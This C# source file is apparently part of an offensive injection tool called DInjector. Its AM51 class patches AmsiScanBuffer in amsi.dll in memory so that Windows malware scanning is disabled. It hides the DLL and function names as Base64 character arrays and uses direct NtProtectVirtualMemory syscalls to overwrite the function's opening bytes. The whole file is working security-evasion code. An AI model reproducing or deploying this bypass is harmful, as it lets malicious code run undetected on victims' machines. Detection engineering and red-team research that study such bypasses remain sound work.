using System;
using System.Text;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class AM51
    {
        // mov    eax,0x80070057 (E_INVALIDARG); ret
        //private static readonly byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        //private static readonly byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        // xor rax, rax
        private static readonly byte[] x64 = new byte[] { 0x48, 0x31, 0xC0 };

        public static void Patch()
        {
            ChangeBytes(x64);
        }

        private static void ChangeBytes(byte[] patch)
        {
            try
            {
                #region LoadLibraryA ("amsi.dll")

                var libNameB64 = new char[] { 'Y', 'W', '1', 'z', 'a', 'S', '5', 'k', 'b', 'G', 'w', '=' };
                var libName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", libNameB64)));
                var hModule = Win32.LoadLibraryA(libName);

                #endregion

                #region GetProcAddress ("AmsiScanBuffer")

                var procNameB64 = new char[] { 'Q', 'W', '1', 'z', 'a', 'V', 'N', 'j', 'Y', 'W', '5', 'C', 'd', 'W', 'Z', 'm', 'Z', 'X', 'I', '=' };
                var procName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", procNameB64)));
                var procAddress = Win32.GetProcAddress(hModule, procName);

                #endregion

                #region NtProtectVirtualMemory (PAGE_READWRITE)

                IntPtr protectAddress = procAddress;
                var regionSize = (IntPtr)patch.Length;
                uint oldProtect = 0;

                var ntstatus = Syscalls.NtProtectVirtualMemory(
                    IntPtr.Zero, //Process.GetCurrentProcess().Handle
                    ref protectAddress,
                    ref regionSize,
                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                    ref oldProtect);

                if (ntstatus == 0)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                else
                    Console.WriteLine($"(AM51) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                Console.WriteLine("(AM51) [>] Patching at address: " + string.Format("{0:X}", procAddress.ToInt64()));
                Marshal.Copy(patch, 0, procAddress, patch.Length);

                #endregion

                #region NtProtectVirtualMemory (oldProtect)

                regionSize = (IntPtr)patch.Length;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    IntPtr.Zero, //Process.GetCurrentProcess().Handle
                    ref procAddress,
                    ref regionSize,
                    oldProtect,
                    ref oldProtect);

                if (ntstatus == 0)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, oldProtect");
                else
                    Console.WriteLine($"(AM51) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(AM51) [x] {e.Message}");
                Console.WriteLine($"(AM51) [x] {e.InnerException}");
            }
        }
    }
}
